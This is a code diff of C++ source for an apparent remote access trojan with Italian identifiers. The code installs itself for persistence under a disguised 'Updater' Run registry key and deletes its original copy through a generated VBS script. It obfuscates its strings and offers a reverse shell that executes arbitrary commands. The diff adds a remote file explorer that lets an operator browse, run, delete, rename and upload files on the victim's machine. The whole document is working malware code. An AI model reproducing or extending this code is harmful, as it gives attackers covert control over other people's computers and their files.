@@ -13,7 +13,6 @@ short InstallClient()
 	RegUtils ru;
 	SystemUtils su;
 	DirUtils du;
-	EasyMSGB msgb;
 
 	string RemVBS = "";
 
@@ -30,10 +29,11 @@ short InstallClient()
 		if (!ru.RegWrite(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
 			return 2;
 
-	//msgb.Ok(PathToCopy);
-
 	if (du.GetFullModuleFilePath() != PathToCopy)
 	{
+		if (DEBUG)
+			cout << PathToCopy << " <- " << du.GetFullModuleFilePath() << endl;
+
 		du.DelFile(PathToCopy);
 		if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
 			return 3;
@@ -44,7 +44,9 @@ short InstallClient()
 		RemVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"";
 
 		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", RemVBS);
-		su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
+
+		if(!DEBUG)
+			su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
 	}
 
 	if (!ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true"))
@@ -54,6 +56,29 @@ short InstallClient()
 
 	return 0;
 }
+
+json DirFileTOjson(VectDirFile DirFiles)
+{
+	DirUtils du;
+	json j;
+
+	for (int i = 0; i < DirFiles.size(); i++)
+	{
+		if (DirFiles[i].Name == ".")
+			DirFiles.erase(DirFiles.begin() + i);
+
+		j["Files"][i]["Type"] = (DirFiles[i].Type == 1);
+		j["Files"][i]["Name"] = (j["Files"][i]["Type"]) ? DirFiles[i].Name : DirFiles[i].Name + "\\";
+		j["Files"][i]["Path"] = (du.GetCurrDir().size() == 3) ? du.GetCurrDir() : du.GetCurrDir() + "\\";
+		j["Files"][i]["FullPath"] = (du.GetCurrDir().size() == 3) ? du.GetCurrDir() + DirFiles[i].Name : du.GetCurrDir() + "\\" + DirFiles[i].Name;
+		j["Files"][i]["Size"] = (j["Files"][i]["Type"]) ? du.GetSizeOfFile(j["Files"][i]["FullPath"]) : 0;
+		j["Files"][i]["LastEdit"] = du.GetTimeOfFile(j["Files"][i]["FullPath"]).LastWriteTime;
+	}
+
+	return j;
+}
+
+// COMANDI
 
 bool GetInfo(SOCKET Sock)
 {
@@ -171,7 +196,7 @@ void ReverseShell(SOCKET Sock)
 	
 	while (true)
 	{
-		Cmd = COMUNICAZIONI::ReverseShell(Sock, Res);
+		Cmd = COMUNICAZIONI::PingPong(Sock, Res);
 		
 		if (Cmd == "")
 			return;
@@ -263,7 +288,7 @@ void ReverseShell(SOCKET Sock)
 		}
 		else if (ToLowerCase(Cmd) == "exit")
 		{
-			COMUNICAZIONI::ReverseShell(Sock, (string)AY_OBFUSCATE("Reverse shell closed"));
+			TcpIP::SendString(Sock, (string)AY_OBFUSCATE("Reverse shell closed"));
 			return;
 		}
 		else if (ToLowerCase(Cmd).substr(0, 7) == "notepad")
@@ -273,6 +298,175 @@ void ReverseShell(SOCKET Sock)
 		}
 		else
 			Res = su.GetCMDOutput(Cmd) + "\n";
+	}
+}
+
+void FileExplorer(SOCKET Sock)
+{
+	SystemUtils su;
+	DirUtils du;
+	string Buff = "";
+	string Res = "";
+	json j;
+
+	VectDirFile DirFiles;
+
+	du.SetCurrDir(du.GetModuleFilePath());
+	du.GetDir(du.GetCurrDir(), DirFiles);
+
+	j = DirFileTOjson(DirFiles);	
+
+	if (DEBUG)
+		cout << j.dump() << endl;
+
+	Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+
+	for (bool b = true; b;)
+	{
+		if (Buff == "")
+			break;
+
+		j.clear();
+		j = json::parse(Buff);
+		
+		if (j["Action"] == "Exit")
+			break;
+		else if (j["Action"] == "OpenDir")
+		{
+			DirFiles.clear();
+
+			if (du.SetCurrDir(j["Path"]))
+			{
+				du.GetDir(du.GetCurrDir(), DirFiles);
+
+				j.clear();
+				j = DirFileTOjson(DirFiles);
+
+				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+			}
+			else
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+		}
+		else if (j["Action"] == "RunFile")
+		{
+			DirFiles.clear();
+
+			du.RunFile(j["Path"]);
+			du.GetDir(du.GetCurrDir(), DirFiles);
+
+			j.clear();
+			j = DirFileTOjson(DirFiles);
+
+			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+		}
+		else if (j["Action"] == "GoUp")
+		{
+			DirFiles.clear();
+
+			if (du.SetCurrDir(du.GetCurrDir() + "\\.."))
+			{
+				du.GetDir(du.GetCurrDir(), DirFiles);
+
+				j.clear();
+				j = DirFileTOjson(DirFiles);
+
+				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+			}
+			else
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+		}
+		else if (j["Action"] == "Delete")
+		{
+			bool Success = false;
+
+			DirFiles.clear();
+
+			if (j["Type"])
+				Success = du.DelFile(j["Path"]);
+			else
+				Success = du.DelDir(j["Path"]);
+
+			if (Success)
+			{
+				du.GetDir(du.GetCurrDir(), DirFiles);
+
+				j.clear();
+				j = DirFileTOjson(DirFiles);
+
+				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+			}
+			else
+			{
+				if (DEBUG)
+				{
+					char errmsg[256];
+					strerror_s(errmsg, 256, errno);
+					cout << errmsg << endl;
+				}
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+			}
+		}
+		else if (j["Action"] == "Refresh")
+		{
+			DirFiles.clear();
+			du.GetDir(du.GetCurrDir(), DirFiles);
+
+			j.clear();
+			j = DirFileTOjson(DirFiles);
+
+			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+		}
+		else if (j["Action"] == "Rename")
+		{
+			DirFiles.clear();
+
+			if (du.RenameFileOrDir(j["OldName"], j["NewName"]))
+			{
+				du.GetDir(du.GetCurrDir(), DirFiles);
+
+				j.clear();
+				j = DirFileTOjson(DirFiles);
+
+				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+			}
+			else
+			{
+				if (DEBUG)
+				{
+					char errmsg[256];
+					strerror_s(errmsg, 256, errno);
+					cout << errmsg << endl;
+				}
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+			}
+		}
+		else if (j["Action"] == "Upload")
+		{
+			string FileName;
+			string FileContent;
+
+			DirFiles.clear();
+
+			if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent))
+				break;
+
+			if (du.WriteBinaryFile(FileName, FileContent))
+			{
+				Buff = COMUNICAZIONI::PingPong(Sock, "OK");
+			}
+			else
+			{
+				if (DEBUG)
+				{
+					char errmsg[256];
+					strerror_s(errmsg, 256, errno);
+					cout << errmsg << endl;
+				}
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+			}
+		}
+		else
+			break;
 	}
 }
 
@@ -331,6 +525,10 @@ short Sessione(TcpIP Client)
 		else if (cmd == (string)AY_OBFUSCATE("reverseshell"))
 		{
 			ReverseShell(Client.Sock);
+		}
+		else if (cmd == "fileexplorer")
+		{
+			FileExplorer(Client.Sock);
 		}
 	}
 
